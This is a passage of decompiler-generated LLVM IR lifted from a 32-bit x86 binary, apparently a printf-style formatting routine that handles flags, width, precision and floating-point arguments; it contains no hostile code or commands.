  %v5_804c49d = add i32 %v4_804c49d, %v0_804c4ac80
  %v6_804c49d = inttoptr i32 %v5_804c49d to i32*
  store i32 %v0_804c49d78, i32* %v6_804c49d, align 4
  %v0_804c4a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c4a4 = add i32 %v0_804c4a4, 12
  store i32 %v1_804c4a4, i32* %edx.global-to-local, align 4
  %v0_804c4a7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c4a7 = add i32 %v0_804c4a7, 1
  %v1_804c4a8.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c4a7, i32* %eax.global-to-local, align 4
  %v2_804c4a8 = sub i32 %v1_804c4a7, %v1_804c4a8.pre
  %v8_804c4a8 = xor i32 %v1_804c4a7, %v1_804c4a8.pre
  %v9_804c4a8 = xor i32 %v2_804c4a8, %v1_804c4a7
  %v10_804c4a8 = and i32 %v9_804c4a8, %v8_804c4a8
  %v11_804c4a8 = icmp slt i32 %v10_804c4a8, 0
  %v13_804c4a8 = icmp slt i32 %v2_804c4a8, 0
  %v2_804c4aa = icmp eq i1 %v13_804c4a8, %v11_804c4a8
  %v0_804c4ac = load i32, i32* @esp, align 4
  br i1 %v2_804c4aa, label %dec_label_pc_804c4ac, label %dec_label_pc_804c49d

dec_label_pc_804c4ac:                             ; preds = %dec_label_pc_804c49d, %dec_label_pc_804c495
  %v0_804c4ac.lcssa = phi i32 [ %v1_804c480, %dec_label_pc_804c495 ], [ %v0_804c4ac, %dec_label_pc_804c49d ]
  %v1_804c4ac = add i32 %v0_804c4ac.lcssa, 48
  %v2_804c4ac = inttoptr i32 %v1_804c4ac to i32*
  %v3_804c4ac = load i32, i32* %v2_804c4ac, align 4
  store i32 %v3_804c4ac, i32* %ecx.global-to-local, align 4
  %v1_804c4b0 = icmp eq i32 %v3_804c4ac, 0
  %v2_804c4b0 = icmp slt i32 %v3_804c4ac, 0
  store i1 %v2_804c4b0, i1* %sf.global-to-local, align 1
  %v1_804c4b2 = icmp eq i1 %v1_804c4b0, false
  br i1 %v1_804c4b2, label %dec_label_pc_804c4da, label %dec_label_pc_804c4b4

dec_label_pc_804c4b4:                             ; preds = %dec_label_pc_804c4ac
  %v1_804c4b4 = inttoptr i32 %v0_804c4ac.lcssa to i32*
  %v2_804c4b4 = load i32, i32* %v1_804c4b4, align 4
  store i32 %v2_804c4b4, i32* %eax.global-to-local, align 4
  %v1_804c4b7 = ashr i32 %v2_804c4b4, 31
  store i32 %v1_804c4b7, i32* %edx.global-to-local, align 4
  %v2_804c4b8 = add i32 %v0_804c4ac.lcssa, -4
  %v3_804c4b8 = inttoptr i32 %v2_804c4b8 to i32*
  store i32 %v1_804c4b7, i32* %v3_804c4b8, align 4
  %v0_804c4b9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c4b9 = add i32 %v0_804c4ac.lcssa, -8
  %v3_804c4b9 = inttoptr i32 %v2_804c4b9 to i32*
  store i32 %v0_804c4b9, i32* %v3_804c4b9, align 4
  %v1_804c4ba = add i32 %v0_804c4ac.lcssa, 32
  %v2_804c4ba = inttoptr i32 %v1_804c4ba to i32*
  %v3_804c4ba = load i32, i32* %v2_804c4ba, align 4
  %v1_804c4be = and i32 %v3_804c4ba, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804c4be, i32* %eax.global-to-local, align 4
  %v2_804c4c3 = add i32 %v0_804c4ac.lcssa, -12
  %v3_804c4c3 = inttoptr i32 %v2_804c4c3 to i32*
  store i32 %v1_804c4be, i32* %v3_804c4c3, align 4
  %v1_804c4c4 = add i32 %v0_804c4ac.lcssa, 344
  %v2_804c4c4 = inttoptr i32 %v1_804c4c4 to i32*
  %v3_804c4c4 = load i32, i32* %v2_804c4c4, align 4
  store i32 %v3_804c4c4, i32* %eax.global-to-local, align 4
  %v1_804c4cb = inttoptr i32 %v3_804c4c4 to i32*
  %v2_804c4cb = load i32, i32* %v1_804c4cb, align 4
  %v4_804c4cb = add i32 %v0_804c4ac.lcssa, -16
  %v5_804c4cb = inttoptr i32 %v4_804c4cb to i32*
  store i32 %v2_804c4cb, i32* %v5_804c4cb, align 4
  %v0_804c4cd = call i32 @function_8050234()
  store i32 %v0_804c4cd, i32* %eax.global-to-local, align 4
  %v0_804c4d2 = load i32, i32* @esp, align 4
  %v1_804c4d2 = add i32 %v0_804c4d2, 16
  %v7_804c4d2 = icmp slt i32 %v1_804c4d2, 0
  store i1 %v7_804c4d2, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804c91c

dec_label_pc_804c4da:                             ; preds = %dec_label_pc_804c4ac
  %v1_804c4da = add i32 %v3_804c4ac, -7
  %v5_804c4da = icmp ult i32 %v3_804c4ac, 7
  %v9_804c4da = icmp eq i32 %v1_804c4da, 0
  %v10_804c4da = icmp slt i32 %v1_804c4da, 0
  store i1 %v10_804c4da, i1* %sf.global-to-local, align 1
  %v2_804c4dd = or i1 %v5_804c4da, %v9_804c4da
  br i1 %v2_804c4dd, label %dec_label_pc_804c4e3, label %dec_label_pc_804c647

dec_label_pc_804c4e3:                             ; preds = %dec_label_pc_804c4da
  %v1_804c4e3 = add i32 %v3_804c4ac, 134560412
  %v2_804c4e3 = inttoptr i32 %v1_804c4e3 to i8*
  %v3_804c4e3 = load i8, i8* %v2_804c4e3, align 1
  %v4_804c4e3 = sext i8 %v3_804c4e3 to i32
  store i32 %v4_804c4e3, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804c4ef = icmp eq i8 %v3_804c4e3, 10
  %v10_804c4ef = icmp slt i8 %v3_804c4e3, 10
  store i1 %v10_804c4ef, i1* %sf.global-to-local, align 1
  %v1_804c4f2 = icmp eq i1 %v9_804c4ef, false
  br i1 %v1_804c4f2, label %dec_label_pc_804c512, label %dec_label_pc_804c4f4

dec_label_pc_804c4f4:                             ; preds = %dec_label_pc_804c4e3
  %v1_804c4f4 = add i32 %v0_804c4ac.lcssa, 32
  %v2_804c4f4 = inttoptr i32 %v1_804c4f4 to i32*
  %v3_804c4f4 = load i32, i32* %v2_804c4f4, align 4
  store i32 %v3_804c4f4, i32* %eax.global-to-local, align 4
  %v1_804c4fa = udiv i32 %v3_804c4f4, 32
  %tmp65 = urem i32 %v1_804c4fa, 2
  %tmp66 = sub nsw i32 45, %tmp65
  %v2_804c50a = or i32 %tmp66, 128
  store i32 %v2_804c50a, i32* %edx.global-to-local, align 4
  %v2_804c50d = and i32 %v3_804c4f4, 64
  %v3_804c50d = icmp eq i32 %v2_804c50d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804c50f = icmp eq i1 %v3_804c50d, false
  %v4_804c50f = select i1 %v1_804c50f, i32 %v2_804c50a, i32 %tmp66
  store i32 %v4_804c50f, i32* @ebx, align 4
  br label %dec_label_pc_804c512

dec_label_pc_804c512:                             ; preds = %dec_label_pc_804c4e3, %dec_label_pc_804c4f4
  %v1_804c512 = add i32 %v3_804c4ac, -5
  %v5_804c512 = icmp ult i32 %v3_804c4ac, 5
  %v9_804c512 = icmp eq i32 %v1_804c512, 0
  %v10_804c512 = icmp slt i32 %v1_804c512, 0
  store i1 %v10_804c512, i1* %sf.global-to-local, align 1
  %v2_804c515 = or i1 %v5_804c512, %v9_804c512
  br i1 %v2_804c515, label %dec_label_pc_804c517, label %dec_label_pc_804c52f

dec_label_pc_804c517:                             ; preds = %dec_label_pc_804c512
  %v1_804c517 = add i32 %v3_804c4ac, -3
  %v9_804c517 = icmp eq i32 %v1_804c517, 0
  %v10_804c517 = icmp slt i32 %v1_804c517, 0
  store i1 %v10_804c517, i1* %sf.global-to-local, align 1
  %v1_804c51a = icmp eq i1 %v9_804c517, false
  br i1 %v1_804c51a, label %dec_label_pc_804c523, label %dec_label_pc_804c51c

dec_label_pc_804c51c:                             ; preds = %dec_label_pc_804c517
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804c531

dec_label_pc_804c523:                             ; preds = %dec_label_pc_804c517
  %v1_804c523 = add i32 %v3_804c4ac, -1
  %v9_804c523 = icmp eq i32 %v1_804c523, 0
  %v10_804c523 = icmp slt i32 %v1_804c523, 0
  store i1 %v10_804c523, i1* %sf.global-to-local, align 1
  br i1 %v9_804c523, label %dec_label_pc_804c536, label %dec_label_pc_804c531

dec_label_pc_804c52f:                             ; preds = %dec_label_pc_804c512
  %v1_804c52f = sub nsw i32 0, %v4_804c4e3
  %v7_804c52f = icmp sgt i8 %v3_804c4e3, 0
  store i1 %v7_804c52f, i1* %sf.global-to-local, align 1
  store i32 %v1_804c52f, i32* @esi, align 4
  br label %dec_label_pc_804c531

dec_label_pc_804c531:                             ; preds = %dec_label_pc_804c523, %dec_label_pc_804c51c, %dec_label_pc_804c52f
  br label %dec_label_pc_804c536

dec_label_pc_804c536:                             ; preds = %dec_label_pc_804c523, %dec_label_pc_804c531
  %storemerge = phi i32 [ 11, %dec_label_pc_804c531 ], [ 6, %dec_label_pc_804c523 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804c536 = add i32 %v0_804c4ac.lcssa, 20
  %v2_804c536 = inttoptr i32 %v1_804c536 to i32*
  %v3_804c536 = load i32, i32* %v2_804c536, align 4
  %v5_804c536 = icmp slt i32 %v3_804c536, 0
  store i1 %v5_804c536, i1* %sf.global-to-local, align 1
  %v1_804c53b = add i32 %v0_804c4ac.lcssa, 7
  %v2_804c53b = inttoptr i32 %v1_804c53b to i8*
  store i8 32, i8* %v2_804c53b, align 1
  %v0_804c540 = load i1, i1* %sf.global-to-local, align 1
  %v1_804c540 = icmp eq i1 %v0_804c540, false
  br i1 %v1_804c540, label %dec_label_pc_804c54a, label %dec_label_pc_804c542

dec_label_pc_804c542:                             ; preds = %dec_label_pc_804c536
  %v0_804c542 = load i32, i32* @esp, align 4
  %v1_804c542 = add i32 %v0_804c542, 36
  %v2_804c542 = inttoptr i32 %v1_804c542 to i8*
  %v3_804c542 = load i8, i8* %v2_804c542, align 1
  %v4_804c542 = zext i8 %v3_804c542 to i32
  %v5_804c542 = load i32, i32* %edx.global-to-local, align 4
  %v6_804c542 = and i32 %v5_804c542, -256
  %v7_804c542 = or i32 %v6_804c542, %v4_804c542
  store i32 %v7_804c542, i32* %edx.global-to-local, align 4
  %v3_804c546 = add i32 %v0_804c542, 7
  %v4_804c546 = inttoptr i32 %v3_804c546 to i8*
  store i8 %v3_804c542, i8* %v4_804c546, align 1
  br label %dec_label_pc_804c54a

dec_label_pc_804c54a:                             ; preds = %dec_label_pc_804c536, %dec_label_pc_804c542
  %v1_804c54a = add i32 %v3_804c4ac, -1
  %v8_804c54a = icmp eq i32 %v1_804c54a, 0
  %v9_804c54a = icmp slt i32 %v1_804c54a, 0
  store i1 %v9_804c54a, i1* %sf.global-to-local, align 1
  store i32 %v1_804c54a, i32* %ecx.global-to-local, align 4
  %v0_804c54b = load i32, i32* @esp, align 4
  %v1_804c54b = add i32 %v0_804c54b, 344
  %v2_804c54b = inttoptr i32 %v1_804c54b to i32*
  %v3_804c54b = load i32, i32* %v2_804c54b, align 4
  store i32 %v3_804c54b, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804c563.pre = load i32, i32* @edi, align 4
  br i1 %v8_804c54a, label %dec_label_pc_804c563, label %dec_label_pc_804c559

dec_label_pc_804c559:                             ; preds = %dec_label_pc_804c54a
  %v2_804c559 = mul i32 %v0_804c563.pre, 4
  %v3_804c559 = add i32 %v0_804c54b, 52
  %v4_804c559 = add i32 %v3_804c559, %v2_804c559
  %v5_804c559 = inttoptr i32 %v4_804c559 to i32*
  %v6_804c559 = load i32, i32* %v5_804c559, align 4
  %v1_804c55d = and i32 %v6_804c559, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804c55d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c563

dec_label_pc_804c563:                             ; preds = %dec_label_pc_804c54a, %dec_label_pc_804c559
  %v2_804c563 = add i32 %v0_804c54b, -4
  %v3_804c563 = inttoptr i32 %v2_804c563 to i32*
  store i32 %v0_804c563.pre, i32* %v3_804c563, align 4
  %v0_804c564 = load i32, i32* @esi, align 4
  %v2_804c564 = add i32 %v0_804c54b, -8
  %v3_804c564 = inttoptr i32 %v2_804c564 to i32*
  store i32 %v0_804c564, i32* %v3_804c564, align 4
  %v0_804c565 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c565 = add i32 %v0_804c54b, -12
  %v3_804c565 = inttoptr i32 %v2_804c565 to i32*
  store i32 %v0_804c565, i32* %v3_804c565, align 4
  %v0_804c566 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c566 = add i32 %v0_804c54b, -16
  %v3_804c566 = inttoptr i32 %v2_804c566 to i32*
  store i32 %v0_804c566, i32* %v3_804c566, align 4
  %v0_804c567 = call i32 @function_80501dc()
  %v0_804c56c = load i32, i32* @ebx, align 4
  %v1_804c56c = load i32, i32* @esp, align 4
  %v2_804c56c = inttoptr i32 %v1_804c56c to i32*
  store i32 %v0_804c56c, i32* %v2_804c56c, align 4
  %v0_804c56f = load i32, i32* @esi, align 4
  %v1_804c56f = load i32, i32* @esp, align 4
  %v2_804c56f = add i32 %v1_804c56f, -4
  %v3_804c56f = inttoptr i32 %v2_804c56f to i32*
  store i32 %v0_804c56f, i32* %v3_804c56f, align 4
  %v0_804c570 = load i32, i32* @edx, align 4
  %v2_804c570 = add i32 %v1_804c56f, -8
  %v3_804c570 = inttoptr i32 %v2_804c570 to i32*
  store i32 %v0_804c570, i32* %v3_804c570, align 4
  %v2_804c571 = add i32 %v1_804c56f, -12
  %v3_804c571 = inttoptr i32 %v2_804c571 to i32*
  store i32 %v0_804c567, i32* %v3_804c571, align 4
  %v1_804c572 = add i32 %v1_804c56f, 347
  store i32 %v1_804c572, i32* %eax.global-to-local, align 4
  %v2_804c579 = add i32 %v1_804c56f, -16
  %v3_804c579 = inttoptr i32 %v2_804c579 to i32*
  store i32 %v1_804c572, i32* %v3_804c579, align 4
  %v0_804c57a = load i32, i32* %stack_var_-364, align 4
  %v5_804c57a = inttoptr i32 %v0_804c57a to i8*
  %v6_804c57a = call i32 @function_8050274(i8* %v5_804c57a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804c57a, i32* %eax.global-to-local, align 4
  %v0_804c57f = load i32, i32* @esp, align 4
  %v1_804c57f = add i32 %v0_804c57f, 32
  %v1_804c582 = add i32 %v0_804c57f, 80
  %v2_804c582 = inttoptr i32 %v1_804c582 to i32*
  %v3_804c582 = load i32, i32* %v2_804c582, align 4
  %v4_804c582 = add i32 %v3_804c582, -5
  %v8_804c582 = icmp ult i32 %v3_804c582, 5
  %v12_804c582 = icmp eq i32 %v4_804c582, 0
  %v13_804c582 = icmp slt i32 %v4_804c582, 0
  store i1 %v13_804c582, i1* %sf.global-to-local, align 1
  store i32 %v6_804c57a, i32* @edi, align 4
  %v2_804c589 = or i1 %v8_804c582, %v12_804c582
  br i1 %v2_804c589, label %dec_label_pc_804c5b3, label %dec_label_pc_804c58b

dec_label_pc_804c58b:                             ; preds = %dec_label_pc_804c563
  %v7_804c57a = inttoptr i32 %v6_804c57a to i8*
  %v3_804c58b = load i8, i8* %v7_804c57a, align 1
  %v4_804c58b = add i8 %v3_804c58b, -45
  %v12_804c58b = icmp eq i8 %v4_804c58b, 0
  %v13_804c58b = icmp slt i8 %v4_804c58b, 0
  store i1 %v13_804c58b, i1* %sf.global-to-local, align 1
  %v1_804c58e = icmp eq i1 %v12_804c58b, false
  %v1_804c59d = add i32 %v0_804c57f, 64
  %v2_804c59d = inttoptr i32 %v1_804c59d to i32*
  %v3_804c59d = load i32, i32* %v2_804c59d, align 4
  br i1 %v1_804c58e, label %dec_label_pc_804c59d, label %dec_label_pc_804c590

dec_label_pc_804c590:                             ; preds = %dec_label_pc_804c58b
  %v4_804c590 = or i32 %v3_804c59d, 2
  store i32 %v4_804c590, i32* %v2_804c59d, align 4
  %v0_804c595 = load i32, i32* @edi, align 4
  %v1_804c595 = add i32 %v0_804c595, 1
  %v9_804c595 = icmp slt i32 %v1_804c595, 0
  store i1 %v9_804c595, i1* %sf.global-to-local, align 1
  store i32 %v1_804c595, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804c5b3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c5b3

dec_label_pc_804c59d:                             ; preds = %dec_label_pc_804c58b
  store i32 %v3_804c59d, i32* %eax.global-to-local, align 4
  %v2_804c5a1 = and i32 %v3_804c59d, 2
  %v3_804c5a1 = icmp eq i32 %v2_804c5a1, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804c5a1, label %dec_label_pc_804c5a9, label %dec_label_pc_804c5a5

dec_label_pc_804c5a5:                             ; preds = %dec_label_pc_804c59d
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804c5b3

dec_label_pc_804c5a9:                             ; preds = %dec_label_pc_804c59d
  %v2_804c5a9 = urem i32 %v3_804c59d, 2
  %v3_804c5a9 = icmp eq i32 %v2_804c5a9, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804c5b0 = icmp eq i1 %v3_804c5a9, false
  %v2_804c5b0 = load i32, i32* @ebp, align 4
  %v4_804c5b0 = select i1 %v1_804c5b0, i32 4, i32 %v2_804c5b0
  store i32 %v4_804c5b0, i32* @ebp, align 4
  br label %dec_label_pc_804c5b3

dec_label_pc_804c5b3:                             ; preds = %dec_label_pc_804c563, %dec_label_pc_804c5a5, %dec_label_pc_804c590, %dec_label_pc_804c5a9
  %v0_804c605 = phi i32 [ %v6_804c57a, %dec_label_pc_804c563 ], [ %v6_804c57a, %dec_label_pc_804c5a5 ], [ %v1_804c595, %dec_label_pc_804c590 ], [ %v6_804c57a, %dec_label_pc_804c5a9 ]
  %v0_804c615 = phi i32 [ %v1_804c57f, %dec_label_pc_804c563 ], [ %v1_804c57f, %dec_label_pc_804c5a5 ], [ %v0_804c5b3.pre, %dec_label_pc_804c590 ], [ %v1_804c57f, %dec_label_pc_804c5a9 ]
  %v1_804c5b3 = add i32 %v0_804c615, 20
  %v2_804c5b3 = inttoptr i32 %v1_804c5b3 to i32*
  %v3_804c5b3 = load i32, i32* %v2_804c5b3, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804c5b7 = sub i32 204, %v0_804c605
  %v2_804c5c3 = add i32 %v1_804c5b7, %v0_804c615
  %v1_804c5c5 = add i32 %v2_804c5c3, 127
  store i32 %v1_804c5c5, i32* @esi, align 4
  %v2_804c5c8 = icmp slt i32 %v3_804c5b3, 0
  store i1 %v2_804c5c8, i1* %sf.global-to-local, align 1
  %v3_804c5ca = select i1 %v2_804c5c8, i32 1, i32 %v3_804c5b3
  store i32 %v3_804c5ca, i32* %ecx.global-to-local, align 4
  %v1_804c5cd = add i32 %v0_804c615, 32
  %v2_804c5cd = inttoptr i32 %v1_804c5cd to i8*
  %v3_804c5cd = load i8, i8* %v2_804c5cd, align 1
  %v4_804c5cd = and i8 %v3_804c5cd, 16
  %v5_804c5cd = icmp eq i8 %v4_804c5cd, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804c5cd, label %dec_label_pc_804c605, label %dec_label_pc_804c5d4

dec_label_pc_804c5d4:                             ; preds = %dec_label_pc_804c5b3
  %v1_804c5d4 = add i32 %v0_804c615, 48
  %v2_804c5d4 = inttoptr i32 %v1_804c5d4 to i32*
  %v3_804c5d4 = load i32, i32* %v2_804c5d4, align 4
  store i32 %v3_804c5d4, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i32 %v3_804c5d4, 3
  %v3_804c5dd = load i32, i32* @ebp, align 4
  %v5_804c5dd = select i1 %tmp67, i32 6, i32 %v3_804c5dd
  store i32 %v5_804c5dd, i32* @ebp, align 4
  %v1_804c5e0 = add i32 %v3_804c5d4, -3
  %v9_804c5e0 = icmp eq i32 %v1_804c5e0, 0
  %v10_804c5e0 = icmp slt i32 %v1_804c5e0, 0
  store i1 %v10_804c5e0, i1* %sf.global-to-local, align 1
  %v1_804c5e3 = icmp eq i1 %v9_804c5e0, false
  br i1 %v1_804c5e3, label %dec_label_pc_804c5ec, label %dec_label_pc_804c5e5

dec_label_pc_804c5e5:                             ; preds = %dec_label_pc_804c5d4
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804c605

dec_label_pc_804c5ec:                             ; preds = %dec_label_pc_804c5d4
  %v1_804c5ec = add i32 %v3_804c5d4, -4
  %v9_804c5ec = icmp eq i32 %v1_804c5ec, 0
  %v10_804c5ec = icmp slt i32 %v1_804c5ec, 0
  store i1 %v10_804c5ec, i1* %sf.global-to-local, align 1
  %v1_804c5ef = icmp eq i1 %v9_804c5ec, false
  br i1 %v1_804c5ef, label %dec_label_pc_804c605, label %dec_label_pc_804c5f1

dec_label_pc_804c5f1:                             ; preds = %dec_label_pc_804c5ec
  %v2_804c5f1 = sub i32 %v3_804c5ca, %v1_804c5c5
  %v7_804c5f1 = icmp ult i32 %v3_804c5ca, %v1_804c5c5
  %v12_804c5f1 = icmp eq i32 %v2_804c5f1, 0
  %v13_804c5f1 = icmp slt i32 %v2_804c5f1, 0
  store i1 %v13_804c5f1, i1* %sf.global-to-local, align 1
  %v2_804c5f3 = or i1 %v7_804c5f1, %v12_804c5f1
  br i1 %v2_804c5f3, label %dec_label_pc_804c5f5, label %dec_label_pc_804c605

dec_label_pc_804c5f5:                             ; preds = %dec_label_pc_804c5f1
  %v1_804c5f5 = inttoptr i32 %v0_804c605 to i8*
  %v2_804c5f5 = load i8, i8* %v1_804c5f5, align 1
  %v3_804c5f5 = add i8 %v2_804c5f5, -48
  %v8_804c5f5 = icmp eq i8 %v3_804c5f5, 0
  %v9_804c5f5 = icmp slt i8 %v3_804c5f5, 0
  store i1 %v9_804c5f5, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804c5f5, label %dec_label_pc_804c605, label %dec_label_pc_804c5ff

dec_label_pc_804c5ff:                             ; preds = %dec_label_pc_804c5f5
  %v1_804c5ff = add i32 %v2_804c5c3, 128
  store i32 %v1_804c5ff, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c605

dec_label_pc_804c605:                             ; preds = %dec_label_pc_804c5f1, %dec_label_pc_804c5f5, %dec_label_pc_804c5ec, %dec_label_pc_804c5b3, %dec_label_pc_804c5e5, %dec_label_pc_804c5ff
  %v0_804c63e = phi i32 [ %v3_804c5ca, %dec_label_pc_804c5f1 ], [ 1, %dec_label_pc_804c5f5 ], [ %v3_804c5ca, %dec_label_pc_804c5ec ], [ %v3_804c5ca, %dec_label_pc_804c5b3 ], [ %v3_804c5ca, %dec_label_pc_804c5e5 ], [ %v1_804c5ff, %dec_label_pc_804c5ff ]
  %v1_804c605 = inttoptr i32 %v0_804c605 to i8*
  %v2_804c605 = load i8, i8* %v1_804c605, align 1
  %v3_804c605 = add i8 %v2_804c605, -48
  %v8_804c605 = icmp eq i8 %v3_804c605, 0
  %v9_804c605 = icmp slt i8 %v3_804c605, 0
  store i1 %v9_804c605, i1* %sf.global-to-local, align 1
  %v1_804c608 = icmp eq i1 %v8_804c605, false
  br i1 %v1_804c608, label %dec_label_pc_804c636, label %dec_label_pc_804c60a

dec_label_pc_804c60a:                             ; preds = %dec_label_pc_804c605
  %v0_804c60a = load i32, i32* @ebp, align 4
  %v1_804c60a = add i32 %v0_804c60a, -6
  %v6_804c60a = sub i32 5, %v0_804c60a
  %v7_804c60a = and i32 %v6_804c60a, %v0_804c60a
  %v8_804c60a = icmp slt i32 %v7_804c60a, 0
  %v10_804c60a = icmp slt i32 %v1_804c60a, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804c612 = icmp eq i1 %v10_804c60a, %v8_804c60a
  %v5_804c612 = select i1 %v2_804c612, i32 11, i32 %v0_804c60a
  store i32 %v5_804c612, i32* @ebp, align 4
  %v1_804c615 = add i32 %v0_804c615, 48
  %v2_804c615 = inttoptr i32 %v1_804c615 to i32*
  %v3_804c615 = load i32, i32* %v2_804c615, align 4
  %v4_804c615 = add i32 %v3_804c615, -1
  %v12_804c615 = icmp eq i32 %v4_804c615, 0
  %v13_804c615 = icmp slt i32 %v4_804c615, 0
  store i1 %v13_804c615, i1* %sf.global-to-local, align 1
  %v1_804c61a = icmp eq i1 %v12_804c615, false
  br i1 %v1_804c61a, label %dec_label_pc_804c62b, label %dec_label_pc_804c61c

dec_label_pc_804c61c:                             ; preds = %dec_label_pc_804c60a
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8053a84.120 to i32), i32* @edi, align 4
  br label %dec_label_pc_804c7b5

dec_label_pc_804c62b:                             ; preds = %dec_label_pc_804c60a
  %v1_804c62b = icmp eq i32 %v0_804c63e, 0
  %v2_804c62b = icmp slt i32 %v0_804c63e, 0
  store i1 %v2_804c62b, i1* %sf.global-to-local, align 1
  %v1_804c62d = icmp eq i1 %v1_804c62b, false
  br i1 %v1_804c62d, label %dec_label_pc_804c636, label %dec_label_pc_804c62f

dec_label_pc_804c62f:                             ; preds = %dec_label_pc_804c62b
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c7b5

dec_label_pc_804c636:                             ; preds = %dec_label_pc_804c62b, %dec_label_pc_804c605
  %v2_804c636 = sub i32 %v0_804c63e, %v1_804c5c5
  %v7_804c636 = icmp ult i32 %v0_804c63e, %v1_804c5c5
  %v12_804c636 = icmp eq i32 %v2_804c636, 0
  %v13_804c636 = icmp slt i32 %v2_804c636, 0
  store i1 %v13_804c636, i1* %sf.global-to-local, align 1
  %v2_804c638 = or i1 %v7_804c636, %v12_804c636
  br i1 %v2_804c638, label %dec_label_pc_804c7b5, label %dec_label_pc_804c63e

dec_label_pc_804c63e:                             ; preds = %dec_label_pc_804c636
  store i1 %v13_804c636, i1* %sf.global-to-local, align 1
  store i32 %v2_804c636, i32* @ebx, align 4
  br label %dec_label_pc_804c7cf

dec_label_pc_804c647:                             ; preds = %dec_label_pc_804c4da
  %v1_804c647 = add i32 %v3_804c4ac, -15
  %v5_804c647 = icmp ult i32 %v3_804c4ac, 15
  %v9_804c647 = icmp eq i32 %v1_804c647, 0
  %v10_804c647 = icmp slt i32 %v1_804c647, 0
  store i1 %v10_804c647, i1* %sf.global-to-local, align 1
  %v2_804c64a = or i1 %v5_804c647, %v9_804c647
  br i1 %v2_804c64a, label %dec_label_pc_804c64c, label %dec_label_pc_804c691

dec_label_pc_804c64c:                             ; preds = %dec_label_pc_804c647
  %v1_804c64c = add i32 %v0_804c4ac.lcssa, 33
  %v2_804c64c = inttoptr i32 %v1_804c64c to i8*
  %v3_804c64c = load i8, i8* %v2_804c64c, align 1
  %v4_804c64c = and i8 %v3_804c64c, 8
  %v5_804c64c = icmp eq i8 %v4_804c64c, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804c651 = add i32 %v0_804c4ac.lcssa, 344
  %v2_804c651 = inttoptr i32 %v1_804c651 to i32*
  %v3_804c651 = load i32, i32* %v2_804c651, align 4
  store i32 %v3_804c651, i32* %edx.global-to-local, align 4
  br i1 %v5_804c64c, label %dec_label_pc_804c65e, label %dec_label_pc_804c65a

dec_label_pc_804c65a:                             ; preds = %dec_label_pc_804c64c
  %v1_804c65a = inttoptr i32 %v3_804c651 to x86_fp80*
  %v2_804c65a = load x86_fp80, x86_fp80* %v1_804c65a, align 4
  br label %dec_label_pc_804c660

dec_label_pc_804c65e:                             ; preds = %dec_label_pc_804c64c
  %v1_804c65e = inttoptr i32 %v3_804c651 to double*
  %v2_804c65e = load double, double* %v1_804c65e, align 4
  %v3_804c65e = fpext double %v2_804c65e to x86_fp80
  br label %dec_label_pc_804c660

dec_label_pc_804c660:                             ; preds = %dec_label_pc_804c65a, %dec_label_pc_804c65e
  %storemerge3 = phi x86_fp80 [ %v2_804c65a, %dec_label_pc_804c65a ], [ %v3_804c65e, %dec_label_pc_804c65e ]
  store x86_fp80 %storemerge3, x86_fp80* %st0.global-to-local, align 4
  %v0_804c660 = load i32, i32* @esi, align 4
  %v2_804c660 = add i32 %v0_804c4ac.lcssa, -4
  %v3_804c660 = inttoptr i32 %v2_804c660 to i32*
  store i32 %v0_804c660, i32* %v3_804c660, align 4
  %v0_804c661 = load i32, i32* @esi, align 4
  %v2_804c661 = add i32 %v0_804c4ac.lcssa, -8
  %v3_804c661 = inttoptr i32 %v2_804c661 to i32*
  store i32 %v0_804c661, i32* %v3_804c661, align 4
  %v1_804c662 = add i32 %v0_804c4ac.lcssa, -12
  %v2_804c662 = inttoptr i32 %v1_804c662 to i32*
  store i32 134529826, i32* %v2_804c662, align 4
  %v1_804c667 = add i32 %v0_804c4ac.lcssa, 20
  store i32 %v1_804c667, i32* %eax.global-to-local, align 4
  %v2_804c66b = add i32 %v0_804c4ac.lcssa, -16
  %v3_804c66b = inttoptr i32 %v2_804c66b to i32*
  store i32 %v1_804c667, i32* %v3_804c66b, align 4
  %v1_804c66c = add i32 %v0_804c4ac.lcssa, -28
  %v10_804c66c = icmp slt i32 %v1_804c66c, 0
  store i1 %v10_804c66c, i1* %sf.global-to-local, align 1
  %v1_804c66f = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804c66f = inttoptr i32 %v1_804c66c to x86_fp80*
  store x86_fp80 %v1_804c66f, x86_fp80* %v3_804c66f, align 4
